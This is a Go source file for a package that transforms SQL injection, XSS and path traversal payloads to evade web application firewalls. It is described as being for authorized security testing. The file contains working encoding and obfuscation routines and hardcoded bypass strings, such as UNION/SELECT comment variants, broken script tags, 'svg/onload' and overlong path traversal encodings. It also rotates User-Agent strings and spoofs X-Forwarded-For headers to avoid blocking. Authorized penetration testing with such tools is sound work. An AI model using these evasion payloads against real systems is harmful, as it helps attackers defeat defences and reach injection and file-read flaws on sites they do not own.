// Package wafevasion provides request transformation techniques to bypass
// WAF (Web Application Firewall) detection. These transformations are
// designed for authorized security testing only.
//
// Techniques include:
// - SQL injection encoding variations (hex, char, comments)
// - XSS payload encoding (HTML entities, JSFuck, unicode)
// - Path traversal obfuscation
// - Header injection / spoofing
// - Case variation
// - Whitespace/comment injection
// - Unicode normalization abuse
package wafevasion

import (
	"encoding/hex"
	"fmt"
	"math/rand"
	"net/url"
	"strings"
	"time"
	"unicode/utf8"
)

// Technique represents a single WAF evasion transformation.
type Technique int

const (
	TechniqueNone Technique = iota
	TechniqueCaseSwap
	TechniqueURLDoubleEncode
	TechniqueURLHexEncode
	TechniqueUnicodeEncode
	TechniqueHTMLEntityEncode
	TechniqueSQLComment
	TechniqueWhitespaceReplace
	TechniqueConcatenation
)

// EvasionConfig controls which evasion techniques to apply.
type EvasionConfig struct {
	// Enabled techniques
	Techniques []Technique
	// Randomize applies techniques in random order
	Randomize bool
	// MaxTransforms limits how many transformations to chain (default 3)
	MaxTransforms int
}

// Default returns a config with common evasion techniques enabled.
func Default() *EvasionConfig {
	return &EvasionConfig{
		Techniques: []Technique{
			TechniqueCaseSwap,
			TechniqueURLHexEncode,
			TechniqueSQLComment,
			TechniqueWhitespaceReplace,
		},
		Randomize:    true,
		MaxTransforms: 3,
	}
}

// init seeds the random generator
func init() {
	rand.Seed(time.Now().UnixNano())
}

// TransformPayload applies evasion techniques to a payload string.
func TransformPayload(payload string, config *EvasionConfig) string {
	if config == nil {
		config = Default()
	}

	result := payload
	techniques := config.Techniques

	if config.Randomize {
		rand.Shuffle(len(techniques), func(i, j int) {
			techniques[i], techniques[j] = techniques[j], techniques[i]
		})
	}

	max := config.MaxTransforms
	if max <= 0 {
		max = 3
	}

	applied := 0
	for _, t := range techniques {
		if applied >= max {
			break
		}
		result = applyTechnique(result, t)
		applied++
	}

	return result
}

// applyTechnique applies a single evasion technique
func applyTechnique(input string, technique Technique) string {
	switch technique {
	case TechniqueCaseSwap:
		return caseSwap(input)
	case TechniqueURLDoubleEncode:
		return urlDoubleEncode(input)
	case TechniqueURLHexEncode:
		return urlHexEncode(input)
	case TechniqueUnicodeEncode:
		return unicodeEncode(input)
	case TechniqueHTMLEntityEncode:
		return htmlEntityEncode(input)
	case TechniqueSQLComment:
		return sqlCommentInsert(input)
	case TechniqueWhitespaceReplace:
		return whitespaceReplace(input)
	case TechniqueConcatenation:
		return concatenation(input)
	default:
		return input
	}
}

// caseSwap randomly swaps case of alphabetic characters
func caseSwap(input string) string {
	var b strings.Builder
	for _, r := range input {
		if r >= 'a' && r <= 'z' {
			if rand.Intn(2) == 0 {
				b.WriteRune(r - 32)
			} else {
				b.WriteRune(r)
			}
		} else if r >= 'A' && r <= 'Z' {
			if rand.Intn(2) == 0 {
				b.WriteRune(r + 32)
			} else {
				b.WriteRune(r)
			}
		} else {
			b.WriteRune(r)
		}
	}
	return b.String()
}

// urlDoubleEncode double-URL-encodes special characters
func urlDoubleEncode(input string) string {
	once := url.QueryEscape(input)
	return url.QueryEscape(once)
}

// urlHexEncode URL-encodes characters as %XX hex
func urlHexEncode(input string) string {
	var b strings.Builder
	for _, r := range input {
		if isSpecialChar(r) {
			b.WriteString(fmt.Sprintf("%%%02x", r))
		} else {
			b.WriteRune(r)
		}
	}
	return b.String()
}

// unicodeEncode encodes as \\uXXXX
func unicodeEncode(input string) string {
	var b strings.Builder
	for _, r := range input {
		if r > 127 || isSpecialChar(r) {
			b.WriteString(fmt.Sprintf("\\u%04x", r))
		} else {
			b.WriteRune(r)
		}
	}
	return b.String()
}

// htmlEntityEncode encodes as &#NN;
func htmlEntityEncode(input string) string {
	var b strings.Builder
	for _, r := range input {
		if isSpecialChar(r) {
			b.WriteString(fmt.Sprintf("&#%d;", r))
		} else {
			b.WriteRune(r)
		}
	}
	return b.String()
}

// sqlCommentInsert inserts SQL comments inside keywords
func sqlCommentInsert(input string) string {
	lower := strings.ToLower(input)
	keywords := []string{"select", "union", "insert", "update", "delete", "drop", "from", "where", "and", "or"}

	result := input
	for _, kw := range keywords {
		if strings.Contains(lower, kw) {
			// Insert /**/ in the middle of the keyword
			mid := len(kw) / 2
			if mid > 0 {
				replacement := kw[:mid] + "/**/" + kw[mid:]
				// Replace case-insensitively
				result = replaceIgnoreCase(result, kw, replacement)
			}
		}
	}
	return result
}

// whitespaceReplace replaces spaces with alternative whitespace characters
func whitespaceReplace(input string) string {
	alternatives := []string{"/**/", "\t", "\n", "%0a", "%09", "+", "/**/"}
	result := strings.ReplaceAll(input, " ", alternatives[rand.Intn(len(alternatives))])
	return result
}

// concatenation splits strings with SQL concatenation operators
func concatenation(input string) string {
	// For SQL contexts: 'test' -> 'te'||'st'
	if len(input) < 4 {
		return input
	}
	mid := len(input) / 2
	return fmt.Sprintf("'%s'||'%s'", input[:mid], input[mid:])
}

// isSpecialChar returns true for characters that should be encoded
func isSpecialChar(r rune) bool {
	switch r {
	case '\'', '"', '<', '>', '&', '=', '%', ' ', '(', ')', ';', '|', '*',
		'!', '#', '$', '^', '@', ':', ',', '?', '[', ']', '{', '}', '/', '\\':
		return true
	default:
		return false
	}
}

// replaceIgnoreCase replaces all occurrences of old with new, case-insensitively
func replaceIgnoreCase(s, old, new string) string {
	lower := strings.ToLower(s)
	oldLower := strings.ToLower(old)
	var b strings.Builder
	idx := 0
	for {
		pos := strings.Index(lower[idx:], oldLower)
		if pos == -1 {
			b.WriteString(s[idx:])
			break
		}
		b.WriteString(s[idx : idx+pos])
		b.WriteString(new)
		idx += pos + len(old)
	}
	return b.String()
}

// EncodeHexBytes returns hex-encoded bytes (for SQL injection like 0x...)
func EncodeHexBytes(input string) string {
	return "0x" + hex.EncodeToString([]byte(input))
}

// URLHexEncodeFn is an exported wrapper for urlHexEncode (used from DSL).
func URLHexEncodeFn(input string) string {
	return urlHexEncode(input)
}

// GenerateSQLiVariants generates multiple SQLi payload variants
// for a given base payload.
func GenerateSQLiVariants(base string) []string {
	variants := []string{
		base,
		caseSwap(base),
		sqlCommentInsert(base),
		whitespaceReplace(base),
		urlHexEncode(base),
		unicodeEncode(base),
	}

	// Add comment variants
	if strings.Contains(strings.ToLower(base), "union") {
		variants = append(variants,
			"UNION/**/SELECT",
			"UNION%0aSELECT",
			"/*!50000UNION*/SELECT",
			"UNION%23%0aSELECT",
		)
	}

	// Add OR-based variants
	if strings.Contains(strings.ToLower(base), "or") {
		variants = append(variants,
			strings.ReplaceAll(base, "or", "||"),
			strings.ReplaceAll(base, "or", "OR"),
		)
	}

	return unique(variants)
}

// GenerateXSSVariants generates multiple XSS payload variants
func GenerateXSSVariants(base string) []string {
	variants := []string{
		base,
		htmlEntityEncode(base),
		urlHexEncode(base),
		unicodeEncode(base),
		urlDoubleEncode(base),
		caseSwap(base),
	}

	// Add common XSS bypass patterns
	if strings.Contains(strings.ToLower(base), "<script") {
		variants = append(variants,
			strings.ReplaceAll(base, "<script", "<ScRiPt"),
			strings.ReplaceAll(base, "<script", "<scr<script>ipt"),
			strings.ReplaceAll(base, "<script", "<svg/onload"),
			strings.ReplaceAll(base, "alert", "al\x00ert"),
		)
	}

	if strings.Contains(base, "javascript:") {
		variants = append(variants,
			strings.ReplaceAll(base, "javascript:", "JaVaScRiPt:"),
			strings.ReplaceAll(base, "javascript:", "java\tscript:"),
			strings.ReplaceAll(base, "javascript:", "java\nscript:"),
		)
	}

	return unique(variants)
}

// GeneratePathTraversalVariants generates path traversal variants
func GeneratePathTraversalVariants(base string) []string {
	variants := []string{
		base,
		strings.ReplaceAll(base, "../", "..%2f"),
		strings.ReplaceAll(base, "../", "%2e%2e/"),
		strings.ReplaceAll(base, "../", "%2e%2e%2f"),
		strings.ReplaceAll(base, "../", "..%252f"),
		strings.ReplaceAll(base, "../", "..%c0%af"),
		strings.ReplaceAll(base, "../", "..%c1%9c"),
		strings.ReplaceAll(base, "..\\", "..%5c"),
		strings.ReplaceAll(base, "..\\", "..%255c"),
	}
	return unique(variants)
}

// unique removes duplicate strings from a slice
func unique(s []string) []string {
	seen := make(map[string]bool)
	result := make([]string, 0)
	for _, v := range s {
		if !seen[v] {
			seen[v] = true
			result = append(result, v)
		}
	}
	return result
}

// RandomUserAgent returns a random User-Agent string to avoid UA-based blocking
func RandomUserAgent() string {
	agents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
		"curl/8.4.0",
		"python-requests/2.31.0",
	}
	return agents[rand.Intn(len(agents))]
}

// RandomXForwardedFor generates a random X-Forwarded-For header value
func RandomXForwardedFor() string {
	return fmt.Sprintf("%d.%d.%d.%d",
		rand.Intn(223)+1,
		rand.Intn(255),
		rand.Intn(255),
		rand.Intn(254)+1)
}

// SuppressUTF8 ensures we count runes not bytes
func SuppressUTF8(s string) int {
	return utf8.RuneCountInString(s)
}
